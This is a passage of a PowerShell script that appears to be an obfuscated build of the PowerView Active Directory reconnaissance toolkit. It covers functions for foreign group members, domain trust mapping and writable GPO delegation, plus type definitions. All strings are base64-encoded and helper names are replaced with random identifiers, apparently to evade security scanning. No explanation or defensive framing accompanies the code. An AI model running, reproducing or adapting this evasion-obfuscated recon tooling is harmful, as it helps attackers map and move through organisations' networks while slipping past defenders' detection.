                        ${1a5d3224ed764fa0a6cfa47ec062dbd3} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwByAG8AdQBwAEQAaQBzAHQAaQBuAGcAdQBpAHMAaABlAGQATgBhAG0AZQA='))) ${9adbe07e9e6946d78d3e1ac6dd36e287}
                        ${1a5d3224ed764fa0a6cfa47ec062dbd3}.PSObject.TypeNames.Insert(0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBGAG8AcgBlAGkAZwBuAFUAcwBlAHIA'))))
                        ${1a5d3224ed764fa0a6cfa47ec062dbd3}
                    }
                }
            }
        }
    }
}
function Get-DomainForeignGroupMember {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.ForeignGroupMember')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('Name')]
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,
        [ValidateNotNullOrEmpty()]
        [String[]]
        $Properties,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,
        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $SecurityMasks,
        [Switch]
        $Tombstone,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        ${afd7d337a750465cb1eadfa1f8ae176d} = @{}
        ${afd7d337a750465cb1eadfa1f8ae176d}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUABGAGkAbAB0AGUAcgA=')))] = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABtAGUAbQBiAGUAcgA9ACoAKQA=')))
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) { ${afd7d337a750465cb1eadfa1f8ae176d}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $Domain }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AcABlAHIAdABpAGUAcwA=')))]) { ${afd7d337a750465cb1eadfa1f8ae176d}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AcABlAHIAdABpAGUAcwA=')))] = $Properties }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))]) { ${afd7d337a750465cb1eadfa1f8ae176d}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))] = $SearchBase }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { ${afd7d337a750465cb1eadfa1f8ae176d}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))]) { ${afd7d337a750465cb1eadfa1f8ae176d}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))] = $SearchScope }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { ${afd7d337a750465cb1eadfa1f8ae176d}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { ${afd7d337a750465cb1eadfa1f8ae176d}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGMAdQByAGkAdAB5AE0AYQBzAGsAcwA=')))]) { ${afd7d337a750465cb1eadfa1f8ae176d}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGMAdQByAGkAdAB5AE0AYQBzAGsAcwA=')))] = $SecurityMasks }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))]) { ${afd7d337a750465cb1eadfa1f8ae176d}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))] = $Tombstone }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${afd7d337a750465cb1eadfa1f8ae176d}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBhAHcA')))]) { ${afd7d337a750465cb1eadfa1f8ae176d}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBhAHcA')))] = $Raw }
    }
    PROCESS {
        ${c8752b24d83c4a8292685cb0845d1d0b} = @($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBzAA=='))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4AIABVAHMAZQByAHMA'))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwB1AGUAcwB0AHMA'))))
        d174ca9e2db1482aa71d60f71b8d2690 @afd7d337a750465cb1eadfa1f8ae176d | Where-Object { ${c8752b24d83c4a8292685cb0845d1d0b} -notcontains $_.samaccountname } | ForEach-Object {
            ${14eb3c56654d4851b0c0e59e10d33e62} = $_.samAccountName
            ${15404ddf39dd4e99bc2807457688a225} = $_.distinguishedname
            ${4f012487c687470fbf918145202d0777} = ${15404ddf39dd4e99bc2807457688a225}.SubString(${15404ddf39dd4e99bc2807457688a225}.IndexOf($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABDAD0A'))))) -replace $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABDAD0A'))),'' -replace ',','.'
            $_.member | ForEach-Object {
                ${f25fc84ed5b248fc9ecac12cdfc415db} = $_.SubString($_.IndexOf($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABDAD0A'))))) -replace $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABDAD0A'))),'' -replace ',','.'
                if (($_ -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBOAD0AUwAtADEALQA1AC0AMgAxAC4AKgAtAC4AKgA=')))) -or (${4f012487c687470fbf918145202d0777} -ne ${f25fc84ed5b248fc9ecac12cdfc415db})) {
                    ${2d9b9a6edbd2493daa68c0013fb257b6} = $_
                    ${4db284038e1e4b3ebf207b4b614fe75c} = $_.Split(',')[0].split('=')[1]
                    ${8d6a3786d5f84d81b8a4645f3040354c} = New-Object PSObject
                    ${8d6a3786d5f84d81b8a4645f3040354c} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwByAG8AdQBwAEQAbwBtAGEAaQBuAA=='))) ${4f012487c687470fbf918145202d0777}
                    ${8d6a3786d5f84d81b8a4645f3040354c} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwByAG8AdQBwAE4AYQBtAGUA'))) ${14eb3c56654d4851b0c0e59e10d33e62}
                    ${8d6a3786d5f84d81b8a4645f3040354c} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwByAG8AdQBwAEQAaQBzAHQAaQBuAGcAdQBpAHMAaABlAGQATgBhAG0AZQA='))) ${15404ddf39dd4e99bc2807457688a225}
                    ${8d6a3786d5f84d81b8a4645f3040354c} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBlAG0AYgBlAHIARABvAG0AYQBpAG4A'))) ${f25fc84ed5b248fc9ecac12cdfc415db}
                    ${8d6a3786d5f84d81b8a4645f3040354c} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBlAG0AYgBlAHIATgBhAG0AZQA='))) ${4db284038e1e4b3ebf207b4b614fe75c}
                    ${8d6a3786d5f84d81b8a4645f3040354c} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBlAG0AYgBlAHIARABpAHMAdABpAG4AZwB1AGkAcwBoAGUAZABOAGEAbQBlAA=='))) ${2d9b9a6edbd2493daa68c0013fb257b6}
                    ${8d6a3786d5f84d81b8a4645f3040354c}.PSObject.TypeNames.Insert(0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBGAG8AcgBlAGkAZwBuAEcAcgBvAHUAcABNAGUAbQBiAGUAcgA='))))
                    ${8d6a3786d5f84d81b8a4645f3040354c}
                }
            }
        }
    }
}
function Get-DomainTrustMapping {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.DomainTrust.NET')]
    [OutputType('PowerView.DomainTrust.LDAP')]
    [OutputType('PowerView.DomainTrust.API')]
    [CmdletBinding(DefaultParameterSetName = 'LDAP')]
    Param(
        [Parameter(ParameterSetName = 'API')]
        [Switch]
        $API,
        [Parameter(ParameterSetName = 'NET')]
        [Switch]
        $NET,
        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,
        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $Properties,
        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,
        [Parameter(ParameterSetName = 'LDAP')]
        [Parameter(ParameterSetName = 'API')]
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,
        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',
        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,
        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,
        [Parameter(ParameterSetName = 'LDAP')]
        [Switch]
        $Tombstone,
        [Parameter(ParameterSetName = 'LDAP')]
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )
    ${adca3f9ecd0d44fab97e1186c435363c} = @{}
    ${fd9ac1a2a57b40c095c74a6bf34fc89d} = New-Object System.Collections.Stack
    ${2e103bf6c16a4ef4b31c7cc13e98a284} = @{}
    if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBQAEkA')))]) { ${2e103bf6c16a4ef4b31c7cc13e98a284}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBQAEkA')))] = $API }
    if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBFAFQA')))]) { ${2e103bf6c16a4ef4b31c7cc13e98a284}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBFAFQA')))] = $NET }
    if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUABGAGkAbAB0AGUAcgA=')))]) { ${2e103bf6c16a4ef4b31c7cc13e98a284}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUABGAGkAbAB0AGUAcgA=')))] = $LDAPFilter }
    if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AcABlAHIAdABpAGUAcwA=')))]) { ${2e103bf6c16a4ef4b31c7cc13e98a284}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AcABlAHIAdABpAGUAcwA=')))] = $Properties }
    if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))]) { ${2e103bf6c16a4ef4b31c7cc13e98a284}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))] = $SearchBase }
    if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { ${2e103bf6c16a4ef4b31c7cc13e98a284}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
    if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))]) { ${2e103bf6c16a4ef4b31c7cc13e98a284}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))] = $SearchScope }
    if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { ${2e103bf6c16a4ef4b31c7cc13e98a284}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
    if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { ${2e103bf6c16a4ef4b31c7cc13e98a284}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit }
    if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))]) { ${2e103bf6c16a4ef4b31c7cc13e98a284}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))] = $Tombstone }
    if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${2e103bf6c16a4ef4b31c7cc13e98a284}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
    if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) {
        ${4152a845ac0043e4ba60766436678ecf} = (c57d9aa48a49482b961291cafd0dde18 -Credential $Credential).Name
    }
    else {
        ${4152a845ac0043e4ba60766436678ecf} = (c57d9aa48a49482b961291cafd0dde18).Name
    }
    ${fd9ac1a2a57b40c095c74a6bf34fc89d}.Push(${4152a845ac0043e4ba60766436678ecf})
    while(${fd9ac1a2a57b40c095c74a6bf34fc89d}.Count -ne 0) {
        $Domain = ${fd9ac1a2a57b40c095c74a6bf34fc89d}.Pop()
        if ($Domain -and ($Domain.Trim() -ne '') -and (-not ${adca3f9ecd0d44fab97e1186c435363c}.ContainsKey($Domain))) {
            Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAFQAcgB1AHMAdABNAGEAcABwAGkAbgBnAF0AIABFAG4AdQBtAGUAcgBhAHQAaQBuAGcAIAB0AHIAdQBzAHQAcwAgAGYAbwByACAAZABvAG0AYQBpAG4AOgAgACcAJABEAG8AbQBhAGkAbgAnAA==')))
            $Null = ${adca3f9ecd0d44fab97e1186c435363c}.Add($Domain, '')
            try {
                ${2e103bf6c16a4ef4b31c7cc13e98a284}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $Domain
                ${404ddfbfb8a54d17a19e159e81121915} = cb9ebd1093564537889c09a039433bbe @2e103bf6c16a4ef4b31c7cc13e98a284
                if (${404ddfbfb8a54d17a19e159e81121915} -isnot [System.Array]) {
                    ${404ddfbfb8a54d17a19e159e81121915} = @(${404ddfbfb8a54d17a19e159e81121915})
                }
                if ($PsCmdlet.ParameterSetName -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBFAFQA')))) {
                    ${04e8097a71c548aa992c430be2be0314} = @{}
                    if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBvAHIAZQBzAHQA')))]) { ${04e8097a71c548aa992c430be2be0314}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBvAHIAZQBzAHQA')))] = $Forest }
                    if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${04e8097a71c548aa992c430be2be0314}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
                    ${404ddfbfb8a54d17a19e159e81121915} += d2abe6f59b2e45909b37ef0d92c496a8 @04e8097a71c548aa992c430be2be0314
                }
                if (${404ddfbfb8a54d17a19e159e81121915}) {
                    if (${404ddfbfb8a54d17a19e159e81121915} -isnot [System.Array]) {
                        ${404ddfbfb8a54d17a19e159e81121915} = @(${404ddfbfb8a54d17a19e159e81121915})
                    }
                    ForEach (${bbf88141abde4bed9b0a899466888d98} in ${404ddfbfb8a54d17a19e159e81121915}) {
                        if (${bbf88141abde4bed9b0a899466888d98}.SourceName -and ${bbf88141abde4bed9b0a899466888d98}.TargetName) {
                            $Null = ${fd9ac1a2a57b40c095c74a6bf34fc89d}.Push(${bbf88141abde4bed9b0a899466888d98}.TargetName)
                            ${bbf88141abde4bed9b0a899466888d98}
                        }
                    }
                }
            }
            catch {
                Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAFQAcgB1AHMAdABNAGEAcABwAGkAbgBnAF0AIABFAHIAcgBvAHIAOgAgACQAXwA=')))
            }
        }
    }
}
function Get-GPODelegation {
    [CmdletBinding()]
    Param (
        [String]
        $GPOName = '*',
        [ValidateRange(1,10000)] 
        [Int]
        $PageSize = 200
    )
    ${1e1665cde4b1462caf61926a48b5d7ec} = @($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBZAFMAVABFAE0A'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4AIABBAGQAbQBpAG4AcwA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQBuAHQAZQByAHAAcgBpAHMAZQAgAEEAZABtAGkAbgBzAA=='))))
    $Forest = [System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()
    ${b810919d5e0e454ba0ea5d0ca220e817} = @($Forest.Domains)
    ${fd9ac1a2a57b40c095c74a6bf34fc89d} = ${b810919d5e0e454ba0ea5d0ca220e817} | foreach { $_.GetDirectoryEntry() }
    foreach ($Domain in ${fd9ac1a2a57b40c095c74a6bf34fc89d}) {
        $Filter = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAAmACgAbwBiAGoAZQBjAHQAQwBhAHQAZQBnAG8AcgB5AD0AZwByAG8AdQBwAFAAbwBsAGkAYwB5AEMAbwBuAHQAYQBpAG4AZQByACkAKABkAGkAcwBwAGwAYQB5AG4AYQBtAGUAPQAkAEcAUABPAE4AYQBtAGUAKQApAA==')))
        ${486dcc688c2b48a488cb68117b070ee0} = New-Object System.DirectoryServices.DirectorySearcher
        ${486dcc688c2b48a488cb68117b070ee0}.SearchRoot = $Domain
        ${486dcc688c2b48a488cb68117b070ee0}.Filter = $Filter
        ${486dcc688c2b48a488cb68117b070ee0}.PageSize = $PageSize
        ${486dcc688c2b48a488cb68117b070ee0}.SearchScope = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB1AGIAdAByAGUAZQA=')))
        ${088fc3559e84473e98170a73ff9731aa} = ${486dcc688c2b48a488cb68117b070ee0}.FindAll()
        foreach (${49c8423a1c59432baa79afb15cafad6f} in ${088fc3559e84473e98170a73ff9731aa}){
            ${9decc31aa5494a009504db9e45778387} = ([ADSI]${49c8423a1c59432baa79afb15cafad6f}.path).ObjectSecurity.Access | ? {$_.ActiveDirectoryRights -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwByAGkAdABlAA=='))) -and $_.AccessControlType -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBsAGwAbwB3AA=='))) -and  ${1e1665cde4b1462caf61926a48b5d7ec} -notcontains $_.IdentityReference.toString().split("\")[1] -and $_.IdentityReference -ne $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBSAEUAQQBUAE8AUgAgAE8AVwBOAEUAUgA=')))}
        if (${9decc31aa5494a009504db9e45778387} -ne $null){
            ${01c75e0463e84ff8b7ec616307aa189d} = New-Object psobject
            ${01c75e0463e84ff8b7ec616307aa189d} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBEAFMAUABhAHQAaAA='))) ${49c8423a1c59432baa79afb15cafad6f}.Properties.adspath
            ${01c75e0463e84ff8b7ec616307aa189d} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBQAE8ARABpAHMAcABsAGEAeQBOAGEAbQBlAA=='))) ${49c8423a1c59432baa79afb15cafad6f}.Properties.displayname
            ${01c75e0463e84ff8b7ec616307aa189d} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBkAGUAbgB0AGkAdAB5AFIAZQBmAGUAcgBlAG4AYwBlAA=='))) ${9decc31aa5494a009504db9e45778387}.IdentityReference
            ${01c75e0463e84ff8b7ec616307aa189d} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBjAHQAaQB2AGUARABpAHIAZQBjAHQAbwByAHkAUgBpAGcAaAB0AHMA'))) ${9decc31aa5494a009504db9e45778387}.ActiveDirectoryRights
            ${01c75e0463e84ff8b7ec616307aa189d}
        }
        }
    }
}
${feb4a0b415b041b29c53659ea0db35b1} = dfa212a664ef40ed9a4d3f737ea1319a -a79b7b0fe03d49c4964d9c78ceedfc48 Win32
${c0d863838e2340d4891deedd48712542} = bec1d6df361147498089ffb19fe424f1 ${feb4a0b415b041b29c53659ea0db35b1} PowerView.SamAccountTypeEnum UInt32 @{
    DOMAIN_OBJECT                   =   $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADAAMAAwADAAMAAwADAAMAA=')))
    GROUP_OBJECT                    =   $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADEAMAAwADAAMAAwADAAMAA=')))
    NON_SECURITY_GROUP_OBJECT       =   $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADEAMAAwADAAMAAwADAAMQA=')))
    ALIAS_OBJECT                    =   $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADIAMAAwADAAMAAwADAAMAA=')))
    NON_SECURITY_ALIAS_OBJECT       =   $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADIAMAAwADAAMAAwADAAMQA=')))
    USER_OBJECT                     =   $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADMAMAAwADAAMAAwADAAMAA=')))
    MACHINE_ACCOUNT                 =   $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADMAMAAwADAAMAAwADAAMQA=')))
    TRUST_ACCOUNT                   =   $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADMAMAAwADAAMAAwADAAMgA=')))
    APP_BASIC_GROUP                 =   $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADQAMAAwADAAMAAwADAAMAA=')))
    APP_QUERY_GROUP                 =   $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADQAMAAwADAAMAAwADAAMQA=')))
    ACCOUNT_TYPE_MAX                =   $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADcAZgBmAGYAZgBmAGYAZgA=')))
}
${b3039f6a810949a6b0f567114730e772} = bec1d6df361147498089ffb19fe424f1 ${feb4a0b415b041b29c53659ea0db35b1} PowerView.GroupTypeEnum UInt32 @{
    CREATED_BY_SYSTEM               =   $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADAAMAAwADAAMAAwADAAMQA=')))
    GLOBAL_SCOPE                    =   $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADAAMAAwADAAMAAwADAAMgA=')))
    DOMAIN_LOCAL_SCOPE              =   $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADAAMAAwADAAMAAwADAANAA=')))
    UNIVERSAL_SCOPE                 =   $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADAAMAAwADAAMAAwADAAOAA=')))
    APP_BASIC                       =   $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADAAMAAwADAAMAAwADEAMAA=')))
    APP_QUERY                       =   $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADAAMAAwADAAMAAwADIAMAA=')))
    SECURITY                        =   $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADgAMAAwADAAMAAwADAAMAA=')))
} -cf9dfce8ea264afa997fad3ee29f75b0
${ad9be41dbd0943c2b70046d95a560c23} = bec1d6df361147498089ffb19fe424f1 ${feb4a0b415b041b29c53659ea0db35b1} PowerView.UACEnum UInt32 @{
    SCRIPT                          =   1
    ACCOUNTDISABLE                  =   2
    HOMEDIR_REQUIRED                =   8
    LOCKOUT                         =   16
    PASSWD_NOTREQD                  =   32
    PASSWD_CANT_CHANGE              =   64
    ENCRYPTED_TEXT_PWD_ALLOWED      =   128
    TEMP_DUPLICATE_ACCOUNT          =   256
    NORMAL_ACCOUNT                  =   512
    INTERDOMAIN_TRUST_ACCOUNT       =   2048
    WORKSTATION_TRUST_ACCOUNT       =   4096
    SERVER_TRUST_ACCOUNT            =   8192
    DONT_EXPIRE_PASSWORD            =   65536
    MNS_LOGON_ACCOUNT               =   131072
    SMARTCARD_REQUIRED              =   262144
    TRUSTED_FOR_DELEGATION          =   524288
    NOT_DELEGATED                   =   1048576
    USE_DES_KEY_ONLY                =   2097152
    DONT_REQ_PREAUTH                =   4194304
    PASSWORD_EXPIRED                =   8388608
    TRUSTED_TO_AUTH_FOR_DELEGATION  =   16777216
    PARTIAL_SECRETS_ACCOUNT         =   67108864
} -cf9dfce8ea264afa997fad3ee29f75b0
${b9f4487dfeac41ffbba47582a19c7845} = bec1d6df361147498089ffb19fe424f1 ${feb4a0b415b041b29c53659ea0db35b1} WTS_CONNECTSTATE_CLASS UInt16 @{
    Active       =    0
    Connected    =    1
    ConnectQuery =    2
    Shadow       =    3
    Disconnected =    4
    Idle         =    5
    Listen       =    6
    Reset        =    7
    Down         =    8
    Init         =    9
}
${026cb2576e7343f29cf542405875fd06} = d15bce5efdc644aeb61c61b619e06627 ${feb4a0b415b041b29c53659ea0db35b1} PowerView.RDPSessionInfo @{
    ExecEnvId = c3139b5db4b64607aa09334cd92daeb1 0 UInt32
    State = c3139b5db4b64607aa09334cd92daeb1 1 ${b9f4487dfeac41ffbba47582a19c7845}
    SessionId = c3139b5db4b64607aa09334cd92daeb1 2 UInt32
    pSessionName = c3139b5db4b64607aa09334cd92daeb1 3 String -bbef160c684049c4bfa1046431e8b186 @($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABQAFcAUwB0AHIA'))))
    pHostName = c3139b5db4b64607aa09334cd92daeb1 4 String -bbef160c684049c4bfa1046431e8b186 @($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABQAFcAUwB0AHIA'))))
    pUserName = c3139b5db4b64607aa09334cd92daeb1 5 String -bbef160c684049c4bfa1046431e8b186 @($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABQAFcAUwB0AHIA'))))
    pDomainName = c3139b5db4b64607aa09334cd92daeb1 6 String -bbef160c684049c4bfa1046431e8b186 @($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABQAFcAUwB0AHIA'))))
